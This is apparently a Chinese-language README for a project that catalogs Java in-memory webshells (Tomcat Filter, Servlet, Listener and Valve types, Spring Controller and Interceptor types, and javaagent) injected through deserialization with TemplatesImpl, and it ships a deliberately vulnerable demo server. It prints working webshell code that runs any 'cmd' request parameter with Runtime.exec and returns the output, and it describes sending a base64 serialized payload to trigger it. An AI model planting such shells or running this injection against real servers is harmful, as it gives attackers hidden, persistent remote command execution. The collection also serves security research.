## JavaMemShell
记录总结Java内存马的类型和相关代码示例

## 项目说明

**JavaMemShell**

利用Java反序列化时TemplatesImpl类加载字节码实现的内存马示例

**Server-Demo**

Spring 5.2.3 和Tomcat8服务端的Demo，接受参数进行反序列化，

## Java内存马类型

**tomcat** 

1. Filter型
2. Servlet型
3. Listener型
4. TomcatValue型

**spring**

1. controller型
2. Interceptor型

**javaagent**

1. 文件落地，持久化

## 核心代码

每种类型shell动态注册的执行逻辑在静态代码块中，由于反序列化需要，实现类需要继承`AbstractTranslet`

```java
static {
        try{
            xxx
        }catch (Exception e){
            e.printStackTrace();
        }
    }
```

获取request和response，执行命令并进行回显的逻辑在 `doFilter`，`requestDestroyed` ，`service`等方法中，如有需要自行替换，示例：

```java
public void service(ServletRequest servletRequest, ServletResponse servletResponse) 
                        throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest)servletRequest;
        HttpServletResponse response =  (HttpServletResponse)servletResponse;

        String method = request.getMethod();
        if ("GET".equals(method)){
            String cmd = request.getParameter("cmd");
            if (cmd != null){
                Process process = Runtime.getRuntime().exec(cmd);
                Scanner s = new Scanner(process.getInputStream()).useDelimiter("\\a");;
                String output = s.hasNext() ? s.next() : "";
                PrintWriter writer = response.getWriter();
                writer.write(output);
                writer.flush();
                writer.close();
            }
        }
    }
```

## 测试

以springInterceptor内存代码为例，将生成序列化的base64代码发送到服务端

![img](https://cdn.nlark.com/yuque/0/2022/png/21878686/1653798985180-c6672740-00d3-4389-85d9-0e4f73cacb74.png)

执行命令：

![img](https://cdn.nlark.com/yuque/0/2022/png/21878686/1653799203090-f9ad191f-288d-4ecb-8a6d-6fdd0591405e.png)

